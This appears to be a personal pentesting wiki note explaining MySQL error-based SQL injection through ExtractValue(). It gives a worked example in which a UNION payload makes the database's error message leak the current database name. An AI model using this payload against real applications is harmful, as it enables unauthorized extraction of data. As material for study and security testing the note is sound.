# Error-Based SQL Injection

---

## Error-Based SQL Injection using `ExtractValue()`

[ExtractValue](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html) is a [[mysql|MySQL]] function that runs an XPath query against a string representing XML data. The function's signature follows:

```sql
ExtractValue($XML_DATA, $XPATH_QUERY);
```

If `$XPATH_QUERY` is syntactically incorrect, MySQL returns the following error message:

```txt
XPATH syntax error: $XPATH_QUERY
```

That's right. It directly returns what you passed in. If you pass in the result of another query (which will obviously be invalid XPath syntax), the result of that query will be returned to you. This is what makes this a powerful technique for error-based SQL injection. You can execute queries and have `ExtractValue()` return the result.

### Example: Get the Current Database Name

Let's say you have found a SQL injection vulnerability in a web application. It won't return the results of the query, but it will return any error messages.

The backend query is:

```sql
SELECT name FROM users WHERE name = '$NAME';
```

You can inject into `$NAME`. To [[mysql#Get Current Database|get the current database name]], you inject `blah' UNION SELECT ExtractValue(0x41, CONCAT(0x0a, (SELECT database())));#`, resulting in the following query:

```sql
SELECT name FROM users WHERE name = 'blah' UNION SELECT ExtractValue(0x41, CONCAT(0x0a, (SELECT database())));#';
```

This results in the ccurrent database being rendered to the user::

```txt
XPATH syntax error: sensitive_application_db
```

---

## References

[SecurityIdiots - Error Based Injection using ExtractValue](http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html)

[YouTube - HTB Baby SQL Challenge](https://www.youtube.com/watch?v=26El8SoblVA)
